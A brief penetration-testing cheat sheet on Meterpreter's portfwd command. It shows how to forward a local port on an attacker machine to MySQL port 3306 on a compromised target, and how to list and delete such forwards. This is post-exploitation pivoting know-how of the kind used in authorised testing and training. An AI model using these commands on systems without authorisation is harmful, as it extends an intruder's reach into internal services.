Forward a local port (on attacker machine) to a remote port (on target machine):
```meterpreter
portfwd add -l 3306 -p 3306 -r 127.0.0.1
[*] Forward TCP relay created: (local) :3306 -> (remote) 127.0.0.1:3306
```
Now we can send traffic to `127.0.0.1:3306` which is relayed to `<remote-ip>:3306`

List port forwarded:
```meterpreter
portfwd list
```

Stop forwarding port (index 1):
```meterpreter
portfwd delete -i 1
```